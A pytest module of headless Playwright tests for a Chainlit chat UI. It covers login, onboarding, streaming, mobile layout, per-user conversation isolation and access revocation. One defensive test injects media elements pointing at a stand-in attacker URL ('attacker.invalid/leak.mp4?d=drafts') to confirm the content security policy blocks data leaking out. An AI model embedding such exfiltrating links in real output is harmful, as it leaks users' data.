"""
Browser tests: the real web UI, driven in headless Chromium.

Owns: what a user of the web UI sees, end to end through the real Chainlit
server and frontend: the login (a wrong password refused), onboarding, the
greeting, streamed replies, tool steps, a returning org and its conversation
resumed after a reload until "Start a new conversation" is chosen, the layout at
phone width (also with an unbreakable word), two users on one org keeping their
conversations apart while one can't open the other's own org, and removed access
ending an open session. The server uses the run's test database. The model is
scripted (serve.py), so no API calls are made. Does not own app.py's logic in
detail (test_ui.py, with a fake Chainlit, covers every branch in milliseconds).

Opt-in: these are marked `browser` and skipped by a plain `pytest` run. Run them
with `pytest -m browser` after `playwright install chromium` (playwright itself
is in requirements-dev.txt).
"""

import os
import socket
import subprocess
import sys
import time
import urllib.request
from collections.abc import Iterator
from pathlib import Path

import pytest

from agent.errors import NEW_CONVERSATION_LABEL
from agent.memory import slugify
from tests.browser.serve import (
    FIRST_SENTENCE,
    RELEASE_FILE_NAME,
    SECOND_SENTENCE,
    SHARED_ORG,
    TEST_PASSWORD,
    TEST_USERS,
)

# In CI the tests must run: a missing playwright fails instead of skipping the job green.
if os.getenv("MACKIE_BROWSER_REQUIRED"):
    import playwright.sync_api as _sync_api  # noqa: F401

playwright = pytest.importorskip("playwright.sync_api")
pytestmark = pytest.mark.browser

SERVER_START_S: float = 60.0
# Upper bound for anything to appear on the page; a hang fails instead of waiting forever.
WAIT_MS: int = 15_000
DESKTOP: dict[str, int] = {"width": 1280, "height": 900}
PHONE: dict[str, int] = {"width": 390, "height": 844}  # a common phone width in CSS pixels


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture(scope="module")
def server(tmp_path_factory, test_database) -> Iterator[tuple[str, Path]]:
    """The real web UI on a free port, on an emptied test database; yields (url, data_dir)."""
    from tests.conftest import _TABLES

    test_database["cleaner"].execute("".join(f"DELETE FROM {table};" for table in _TABLES))
    data_dir, port = tmp_path_factory.mktemp("data"), _free_port()
    log = (data_dir / "server.log").open("w")
    env = os.environ | {
        "MACKIE_DATABASE_URL": test_database["app"],
        "CHAINLIT_AUTH_SECRET": "browser-tests-only-" + "x" * 32,
    }
    process = subprocess.Popen(
        [sys.executable, str(Path(__file__).parent / "serve.py"), str(data_dir), str(port)],
        stdout=log,
        stderr=subprocess.STDOUT,
        env=env,
    )
    url = f"http://127.0.0.1:{port}"
    deadline = time.monotonic() + SERVER_START_S
    while time.monotonic() < deadline and process.poll() is None:
        try:
            urllib.request.urlopen(url, timeout=1)
            break
        except OSError:
            time.sleep(0.2)
    else:
        process.kill()
        pytest.fail(f"web UI did not start:\n{(data_dir / 'server.log').read_text()[-2000:]}")
    yield url, data_dir
    process.terminate()
    process.wait(timeout=10)
    log.close()


@pytest.fixture(scope="module")
def browser() -> Iterator:
    with playwright.sync_playwright() as p:
        chromium = p.chromium.launch()
        yield chromium
        chromium.close()


@pytest.fixture
def new_page(browser) -> Iterator:
    """Makes pages, each in a new browser profile (its own cookies); closes them all after."""
    contexts = []

    def make(viewport: dict[str, int] = DESKTOP):
        contexts.append(browser.new_context(viewport=viewport))
        return contexts[-1].new_page()

    yield make
    for context in contexts:
        context.close()


def _open(new_page, url: str, viewport: dict[str, int] = DESKTOP, user: str = TEST_USERS[0]):
    """A page in its own browser profile, so its own session, logged in as user."""
    page = new_page(viewport)
    page.console_errors = []
    page.goto(url)
    _log_in(page, user, TEST_PASSWORD)
    page.on("console", lambda m: page.console_errors.append(m.text) if m.type == "error" else None)
    return page


def _log_in(page, user: str, password: str) -> None:
    page.locator("#email").fill(user, timeout=WAIT_MS)
    page.locator("#password").fill(password)
    page.get_by_role("button", name="Sign In").click()


def _send(page, text: str) -> None:
    box = page.locator("#chat-input")
    box.click()
    box.fill(text)
    page.keyboard.press("Enter")


def _onboard(page, org: str) -> None:
    page.get_by_text("What organization are you working with?").wait_for(timeout=WAIT_MS)
    _send(page, org)
    page.get_by_role("button", name="Yes, that's us").click(timeout=WAIT_MS)


def _wait_for_text(page, text: str) -> None:
    page.get_by_text(text, exact=False).last.wait_for(timeout=WAIT_MS)


def test_a_reply_appears_while_it_is_still_streaming(server, new_page):
    """The second sentence is held back until the test releases it; the first must show already."""
    url, data_dir = server
    page = _open(new_page, url)
    _onboard(page, "Stream Org")
    _wait_for_text(page, "set up for")

    _send(page, "stream slowly")
    _wait_for_text(page, FIRST_SENTENCE)
    assert SECOND_SENTENCE.strip() not in page.inner_text("body")
    (data_dir / RELEASE_FILE_NAME).touch()
    _wait_for_text(page, SECOND_SENTENCE.strip())


def test_the_chat_fits_a_phone_screen(server, new_page):
    url, _ = server
    page = _open(new_page, url, PHONE)
    page.get_by_text("What organization are you working with?").wait_for(timeout=WAIT_MS)

    def fits_the_screen(locator) -> bool:
        # Measured in the page in one step: a streamed reply's element is replaced when the
        # stream ends, and a separate wait-then-measure could catch it detached.
        left, width = locator.evaluate(
            "e => [e.getBoundingClientRect().x, e.getBoundingClientRect().width]"
        )
        return left >= 0 and left + width <= PHONE["width"]

    assert fits_the_screen(page.locator("#chat-input"))
    _send(page, "Phone Org")
    confirm = page.get_by_role("button", name="Yes, that's us")
    confirm.wait_for(timeout=WAIT_MS)
    assert fits_the_screen(confirm)
    confirm.click()
    _wait_for_text(page, "set up for")
    _send(page, "a long message " * 30)
    _wait_for_text(page, "Messages I can see: 1.")
    assert fits_the_screen(page.get_by_text("Messages I can see: 1.").last)
    assert page.evaluate("document.documentElement.scrollWidth <= window.innerWidth")

    # One unbreakable word, in the reply's tool step, must wrap instead of widening the page.
    _send(page, "save " + "x" * 200)
    _wait_for_text(page, "Saved it to the ledger.")
    assert page.evaluate("document.documentElement.scrollWidth <= window.innerWidth")


def test_a_wrong_password_is_refused(server, new_page):
    url, _ = server
    page = new_page()
    page.goto(url)
    _log_in(page, TEST_USERS[0], "not the password")
    _wait_for_text(page, "Unable to sign in")
    assert "What organization are you working with?" not in page.inner_text("body")


def test_two_users_on_one_org_keep_their_conversations_apart_until_access_is_removed(
    server, new_page, test_database
):
    url, _ = server
    alice_own = _open(new_page, url)
    _onboard(alice_own, "Alice Only Org")
    _wait_for_text(alice_own, "set up for")

    alice, bob = _open(new_page, url), _open(new_page, url, user=TEST_USERS[1])
    _onboard(alice, SHARED_ORG)
    _onboard(bob, "Alice Only Org")
    _wait_for_text(bob, "You don't have access to")
    assert "set up for" not in bob.inner_text("body")
    _send(bob, SHARED_ORG)
    bob.get_by_role("button", name="Yes, that's us").last.click(timeout=WAIT_MS)
    for page in (alice, bob):
        _wait_for_text(page, "set up for")

    _send(alice, "secret plan from Alice")
    _wait_for_text(alice, "Messages I can see: 1.")
    _send(bob, "hello from Bob")
    _wait_for_text(bob, "You said: hello from Bob. Messages I can see: 1.")
    assert "secret plan" not in bob.inner_text("body")

    _send(alice, "and a second message")
    _wait_for_text(alice, "Messages I can see: 2.")  # Alice keeps her own history

    # Removing Alice's access ends her open session; Bob's membership stays.
    test_database["cleaner"].execute(
        "DELETE FROM memberships WHERE org_id = %s AND user_id = "
        "(SELECT user_id FROM users WHERE username = %s)",
        (slugify(SHARED_ORG), TEST_USERS[0]),
    )
    _send(alice, "third message")
    _wait_for_text(alice, f"You no longer have access to {slugify(SHARED_ORG)}")
    assert "Messages I can see: 3." not in alice.inner_text("body")
    _send(alice, "fourth message")
    _wait_for_text(alice, "Please refresh the page to start a new session")
    _send(bob, "still here")
    _wait_for_text(bob, "You said: still here. Messages I can see: 2.")


def test_a_conversation_resumes_after_a_reload_until_a_new_one_is_started(
    server, new_page, test_database
):
    """Onboarding, a saved post's tool step, then the greeting and recap after a reload."""
    url, _ = server
    page = _open(new_page, url)
    _onboard(page, "Resume Org, https://resume.example")
    _wait_for_text(page, "set up for")
    assert "Resume Org" in page.inner_text("body")

    _send(page, "save Gala recap")
    _wait_for_text(page, "Saved it to the ledger.")
    assert "save_post" in page.inner_text("body")
    titles = (
        test_database["cleaner"]
        .execute("SELECT details->>'title' FROM posts WHERE org_id = 'resume-org'")
        .fetchall()
    )
    assert titles == [("Gala recap",)]

    page.reload()
    _onboard(page, "Resume Org")
    _wait_for_text(page, "We were in the middle of a conversation")
    body = page.inner_text("body")
    assert "Welcome back!" in body and "I remember 0 brand preferences and 1 post." in body
    assert body.index("save Gala recap") < body.index("Saved it to the ledger.")
    _send(page, "what was it?")
    _wait_for_text(page, "You said: what was it?. Messages I can see: 2.")  # the model sees both

    page.get_by_role("button", name=NEW_CONVERSATION_LABEL).click(timeout=WAIT_MS)
    _wait_for_text(page, "Started a new conversation")
    _send(page, "fresh start")
    _wait_for_text(page, "You said: fresh start. Messages I can see: 1.")
    assert page.console_errors == []


@pytest.mark.parametrize("tag", ["img", "video", "audio"])
def test_the_page_loads_media_only_from_mackie(server, new_page, tag):
    """
    A reply's Markdown image to another site would send data out just by being shown;
    Chainlit shows one ending in .mp4 as a video, which the image rule alone let through.
    """
    url, _ = server
    page = new_page(DESKTOP)
    page.goto(url)
    blocked = page.evaluate(
        """tag => new Promise(resolve => {
            document.addEventListener("securitypolicyviolation", e => resolve(e.blockedURI));
            const element = document.createElement(tag);
            element.src = "https://attacker.invalid/leak.mp4?d=drafts";
            document.body.appendChild(element);
        })""",
        tag,
    )
    assert blocked.startswith("https://attacker.invalid/")
